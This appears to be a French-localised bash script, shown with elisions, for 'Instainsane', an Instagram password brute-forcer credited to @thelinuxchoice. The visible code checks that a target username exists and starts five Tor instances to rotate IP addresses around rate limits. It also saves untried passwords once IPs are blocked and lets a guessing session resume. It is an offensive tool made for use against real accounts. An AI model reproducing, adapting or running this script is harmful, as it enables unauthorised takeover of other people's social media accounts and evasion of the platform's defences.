...
printf "\e[5;36m  _              _            \e[0m\e[5;91m_____                                  \e[0m\n"
printf "\e[5;36m (_) _ __   ___ | |_   __ _   \e[0m\e[5;91m\_   \ _ __   ___   __ _  _ __    ___  \e[0m\n"
printf "\e[5;36m | || '_ \ / __|| __| / _\` |   \e[0m\e[5;91m/ /\/| '_ \ / __| / _\` || '_ \  / _ \ \e[0m\n"
printf "\e[5;36m | || | | |\__ \| |_ | (_| |\e[0m\e[5;91m/\/ /_  | | | |\__ \| (_| || | | ||  __/ \e[0m\n"
printf "\e[5;36m |_||_| |_||___/ \__| \__,_|\e[0m\e[5;91m\____/  |_| |_||___/ \__,_||_| |_| \___| \e[0m\n"
printf "\n"
printf "\e[1;44m  Instagram\e[0m \e[7mBrute\e[0m \e[41mForcer\e[0m \e[1mv1.0\e[0m, \e[90mAuteur: \e[92m@thelinuxchoice\e[90m (Github/IG)  \e[0m\n" #Don't change, noob
printf "\n"
}


function start() {
read -p $'\e[1;92mUtilisateur: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mMauvais nom d'utilisateur, essaye de nouveau!\e[0m\n"
sleep 1
start
else
...
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mUtilisez \"sudo\" juste avant la fonction !\n\e[0m"
    exit 1
fi
}
...
command -v tor > /dev/null 2>&1 || { echo >&2 "Tor n'est pas installé. \e[32mExecute sudo ./install.sh\e[39m"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl n'est pas installé. \e[32mExecute sudo ./install.sh\e[39m"; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "Openssl n'est pas installé. \e[32mExecute sudo ./install.sh\e[39m"; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "Problème d'installation, essaye de réinstaller le programme"; exit 1; }
...
printf "\e[1;92m[*] Lancement de TOR sur le port :\e[0m\e[1;77m 9051\e[0m\n"
tor -f multitor/multitor1 > /dev/null &
tor1=$!
#printf "Process %s\n" $tor1
sleep 6
printf "\e[1;92m[*] Lancement de TOR sur le port :\e[0m\e[1;77m 9052\e[0m\n"
tor -f multitor/multitor2 > /dev/null & 
tor2=$!
sleep 6
printf "\e[1;92m[*] Lancement de TOR sur le port :\e[0m\e[1;77m 9053\e[0m\n"
tor -f multitor/multitor3 > /dev/null &
sleep 6
printf "\e[1;92m[*] Lancement de TOR sur le port :\e[0m\e[1;77m 9054\e[0m\n"
tor -f multitor/multitor4 > /dev/null &
sleep 6
printf "\e[1;92m[*] Lancement de TOR sur le port :\e[0m\e[1;77m 9055\e[0m\n"
tor -f multitor/multitor5 > /dev/null &
sleep 6
checkcount=0
printf "\e[1;92m[*] Tentative de connection au port:\e[0m\e[1;77m 9051\e[0m..."
check1=$(curl --socks5-hostname localhost:9051 -s https://www.google.com > /dev/null; echo $?)
if [[ "check1" -gt 0 ]]; then
printf "\e[1;91mPROBLEME!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Tentative de connection au port:\e[0m\e[1;77m 9052\e[0m..."
...
printf "\e[1;92m[*] Tentative de connection au port:\e[0m\e[1;77m 9053\e[0m..."
...
printf "\e[1;92m[*] Tentative de connection au port:\e[0m\e[1;77m 9054\e[0m..."
...
printf "\e[1;92m[*] Tentative de connection au port:\e[0m\e[1;77m 9055\e[0m..."
...
printf "\e[1;91mIl ya un problème avec la connection au ports TOR.\e[0m\n"
exit 1
fi
printf "\n"
printf "\e[1;77m[*] Démarrage...\e[0m\n"
printf "\e[1;91m [*] Appuyez sur Crtl + C pour arreter/sauvegarder la session.\e[0m\n"
sleep 2
}
...
if [[ -n "$threads" ]]; then
printf "\n"
printf "\e[1;91m [*] Fermeture du programme...\n\e[0m"
...
printf "\e[1;92m [!] Impossible de vérifier le mot de passe, IP bloqué :\e[0m\e[1;77m %s\e[0m\n" $not
ssfile="nottested.$user.$RANDOM"
sfile=$(mv nottested.lst $ssfile | echo $ssfile) 
printf "\e[1;92m [*] Sauvegardé :\e[0m\e[1;77m %s\n" $sfile
rm -rf nottested.lst
printf "\e[1;91m [!] Utilise ce fichier comme une liste de mot de passe.\e[0m\n"
fi
default_session="O"
printf "\n\e[1;77m [?] Sauvegarde la session pour\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [O/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "O" || "$session" == "o" || "$session" == "oui" || "$session" == "Oui" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
IFS=$'\n'
...
printf "\e[1;92mUtilise \e[32msudo ./instainsane.sh --resume\e[0m\n"
else
exit 1
fi
else
